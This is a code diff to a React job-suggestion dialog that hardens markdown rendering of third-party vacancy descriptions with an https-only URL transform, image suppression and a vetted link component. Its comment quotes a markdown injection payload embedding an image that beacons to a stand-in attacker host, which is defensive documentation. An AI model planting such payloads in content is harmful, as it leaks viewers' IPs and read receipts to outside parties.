@@ -1,5 +1,5 @@
 import { useState } from 'react'
-import ReactMarkdown from 'react-markdown'
+import ReactMarkdown, { type Components } from 'react-markdown'
 import { ExternalLink, Loader2, ThumbsDown, ThumbsUp, X } from 'lucide-react'
 import type { JobExclusionDto, JobSuggestionDto } from '@crm/shared'
 import {
@@ -20,7 +20,51 @@ import {
   DialogTitle,
 } from '@/components/ui/crm-dialog'
 import { Input } from '@/components/ui/input'
-import { openOriginalPosting } from './open-original'
+import { isSafeExternalUrl, openOriginalPosting } from './open-original'
+
+/**
+ * RENDER-SIDE HARDENING — security-review round 2, HIGH-1.
+ *
+ * The previous claim of "two independent layers" was wrong. The ingest layer
+ * (html-to-markdown.ts) MANUFACTURED the injection by interpolating the link
+ * destination raw, and the "we don't enable rehype-raw" argument does not
+ * apply at all to the payload that resulted:
+ *
+ *   [t](https://ok.example/x)![](https://evil.example/px.png?leak=1)
+ *
+ * — that is valid MARKDOWN, not raw HTML. The only thing that stood between it
+ * and a beacon request to a foreign host was react-markdown's own default
+ * `urlTransform`: a library internal we neither configured nor documented, and
+ * therefore never actually chose.
+ *
+ * These three props are OUR second layer, independent of the API by
+ * construction — they hold even if `descriptionMd` arrives fully attacker-
+ * controlled (pinned by a test that feeds exactly that):
+ *
+ *   1. `urlTransform` — ours, https-only, same predicate as the one guarding
+ *      `window.open`. Not the library default.
+ *   2. `img: () => null` — a third-party job ad NEVER renders a remote image in
+ *      our authenticated origin. This kills the beacon class outright (read
+ *      receipt + viewer IP), regardless of how the markdown was produced.
+ *      `img-src` in our CSP is a blanket `https:` (noted in #470), so the
+ *      browser would not have stopped it either.
+ *   3. `a` — our own anchor: destination re-validated, `rel="noopener
+ *      noreferrer nofollow"`, opens in a new tab. An unsafe destination
+ *      degrades to plain text rather than a live link.
+ */
+const MARKDOWN_URL_TRANSFORM = (url: string): string => (isSafeExternalUrl(url) ? url : '')
+
+const MARKDOWN_COMPONENTS: Components = {
+  img: () => null,
+  a: ({ href, children }) =>
+    isSafeExternalUrl(href) ? (
+      <a href={href} target="_blank" rel="noopener noreferrer nofollow">
+        {children}
+      </a>
+    ) : (
+      <>{children}</>
+    ),
+}
 
 /**
  * Подбор вакансий — the working loop of task-job-sourcing-slice1.
@@ -31,10 +75,13 @@ import { openOriginalPosting } from './open-original'
  *
  * SECURITY — two things this component is deliberately careful about:
  *
- *  1. `descriptionMd` comes from a third party. It is rendered with
- *     react-markdown and NO `rehype-raw`, so raw HTML in the string stays TEXT.
- *     (The API already converted the feed's HTML to markdown and dropped
- *     script/style — this is the second, independent layer.)
+ *  1. `descriptionMd` comes from a third party — and on a PUBLIC board, from
+ *     whoever posted the vacancy. Rendering is hardened by the three
+ *     `ReactMarkdown` props above (`urlTransform` / `img` / `a`); NOT enabling
+ *     `rehype-raw` is necessary but nowhere near sufficient, because a
+ *     markdown-level payload is not raw HTML at all. See the
+ *     MARKDOWN_COMPONENTS docblock for the incident that taught us the
+ *     difference.
  *  2. «Открыть оригинал» calls `window.open` SYNCHRONOUSLY, first thing in the
  *     handler. See open-original.ts for the full reasoning; the short version
  *     is that an `await` in front of it makes the button silently do nothing on
@@ -241,12 +288,17 @@ export function JobSuggestionDialog({
                 data-testid="job-suggestion-description"
               >
                 {/*
-                  NO rehype-raw: raw HTML inside the markdown must stay TEXT.
-                  Adding it would turn a hostile feed into stored XSS in an
-                  authenticated origin — pinned by
+                  NO rehype-raw (raw HTML stays TEXT) — plus the three props
+                  above, which are what actually stop a MARKDOWN-level payload.
+                  See the MARKDOWN_COMPONENTS docblock; pinned by
                   __tests__/JobSuggestionDialog.test.tsx.
                 */}
-                <ReactMarkdown>{current.posting.descriptionMd}</ReactMarkdown>
+                <ReactMarkdown
+                  urlTransform={MARKDOWN_URL_TRANSFORM}
+                  components={MARKDOWN_COMPONENTS}
+                >
+                  {current.posting.descriptionMd}
+                </ReactMarkdown>
               </div>
             </article>
           )}
